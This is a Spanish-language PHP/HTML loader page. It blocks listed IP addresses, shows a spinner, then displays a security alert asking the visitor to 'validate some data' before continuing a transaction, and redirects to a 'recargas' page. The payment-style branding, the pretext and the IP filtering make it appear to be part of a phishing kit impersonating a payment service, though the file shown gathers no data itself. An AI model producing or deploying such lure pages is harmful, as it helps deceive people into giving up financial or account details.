<?php
// --- IP BLACKLIST GLOBAL CHECK ---
$client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
if (!empty($client_ip)) {
    $client_ip = trim(explode(',', $client_ip)[0]);
}
$secRoot = __DIR__; while($secRoot !== dirname($secRoot)) { if (file_exists($secRoot . '/includes/security.php')) { require_once $secRoot . '/includes/security.php'; break; } $secRoot = dirname($secRoot); } $blacklist_file = (function_exists('sura_get_project_root') ? sura_get_project_root() : $secRoot) . '/blocked_ips.txt';
if (file_exists($blacklist_file)) {
    $blocked_ips = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($client_ip, $blocked_ips)) {
        header("HTTP/1.1 403 Forbidden");
        exit("Acceso denegado.");
    }
}
// ---------------------------------

// loader.php
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Validación</title>
  <meta name="theme-color" content="#e3007b" />
  <style>
    html,body{
      height:100%;
      margin:0;
      font-family:Inter,system-ui,-apple-system,"Segoe UI",Roboto,Arial,sans-serif;
      background:#fff;
      transition:background .3s ease;
    }
    .center{
      height:100%;
      display:flex;
      align-items:center;
      justify-content:center;
      flex-direction:column;
    }
    .spinner{
      width:56px;height:56px;
      border-radius:50%;
      border:6px solid #f3d3e6;
      border-top-color:#e3007b;
      animation:spin 1s linear infinite;
    }
    @keyframes spin{to{transform:rotate(360deg)}}
    .muted{color:#8e8e99;font-size:14px;margin-top:14px}

    .alerta{
      width:90%;
      max-width:360px;
      background:#fff;
      border-radius:12px;
      padding:28px 24px;
      text-align:center;
      box-shadow:0 4px 20px rgba(0,0,0,.2);
      display:none;
    }
    .alerta img{width:70px;margin-bottom:16px}
    .alerta h3{font-size:18px;color:#222;margin-bottom:10px}
    .alerta p{font-size:14px;color:#555;margin-bottom:22px;line-height:1.5}

    .btn{
      width:100%;
      max-width:260px;
      padding:12px;
      border-radius:8px;
      border:none;
      background:#e3007b;
      color:#fff;
      font-size:15px;
      font-weight:600;
      cursor:pointer;
    }
  </style>
</head>
<body>

<div class="center">

  <!-- Loader inicial -->
  <div id="loading">
    <div class="spinner"></div>
  </div>

  <!-- Alerta -->
  <div class="alerta" id="alerta">
    <img src="alerta.png" alt="Alerta">
    <h3>Queremos validar que eres tú</h3>
   <p>
  Por motivos de seguridad necesitamos validar algunos datos
  antes de continuar con la transacción.
</p>

    <button class="btn" id="btnContinuar">Continuar</button>
  </div>

</div>

<script>
  const loading = document.getElementById("loading");
  const alerta  = document.getElementById("alerta");

  // 1️⃣ Loader inicial
  setTimeout(() => {
    loading.style.display = "none";
    document.body.style.background = "#4b1258";
    alerta.style.display = "block";
  }, 3000);

  // 2️⃣ Click → redirigir
  document.getElementById("btnContinuar").addEventListener("click", () => {
    window.location.href = "recargas/index.html";
  });
</script>

</body>
</html>
